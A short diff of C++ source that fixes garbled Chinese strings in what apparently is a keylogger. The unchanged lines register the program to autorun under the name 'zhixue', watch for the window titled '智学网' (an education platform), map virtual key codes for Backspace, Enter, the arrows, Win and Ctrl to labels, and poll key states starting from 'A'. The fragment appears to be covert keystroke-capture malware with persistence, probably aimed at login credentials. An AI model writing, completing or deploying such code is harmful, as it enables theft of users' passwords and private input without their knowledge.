@@ -9,13 +9,13 @@ const int length_ = 256;
 void write(Stack<string>& p);
 int keydu(int num, string s, Stack<string>&);
 void keys_number_1(Stack<string>&);
-string ch_1[]{ {"(Bak)"},{"(Tab)"},{"(Etr)"},{"(Esc)"},{"(Spa)"},{"(Del)"},{"(脳贸)"},{"(脡脧)"},{"(脫脪)"},{"(脧脗)"},{"(CpL)"},{"(Win)"},{"(Win)"},{"(Ctr)"} };
+string ch_1[]{ {"(Bak)"},{"(Tab)"},{"(Etr)"},{"(Esc)"},{"(Spa)"},{"(Del)"},{"(左)"},{"(上)"},{"(右)"},{"(下)"},{"(CpL)"},{"(Win)"},{"(Win)"},{"(Ctr)"} };
 int ch_1_len = sizeof(ch_1) / sizeof(ch_1[0]);
 char ch_1_[]{ 0x08,0x09,0x0D,0x1B,0x20,0x2E,0x25,0x26,0x27,0x28,0x14,0x5B,0x5C,0x11 };
 int main() {
 	KUR::Kwin::SetAutoRun("zhixue");
 	int count = 10;
-	string str = "脰脟脩搂脥酶";
+	string str = "智学网";
 	TCHAR titles[length_] = { 0 };
 	Stack<string> p(64);
 	int y = 0;
@@ -46,7 +46,7 @@ int main() {
 	system("pause");
 	return 0;
 }
-void keys_number_1(Stack<string>& p) {
+void keys_number_1(Stack<string>& p) {//这写得真够烂的,要不是找不到其它办法,也不会写这种...
 	Sleep(1);
 	int ch = 0x41;
 	int t = 0, k = 0;
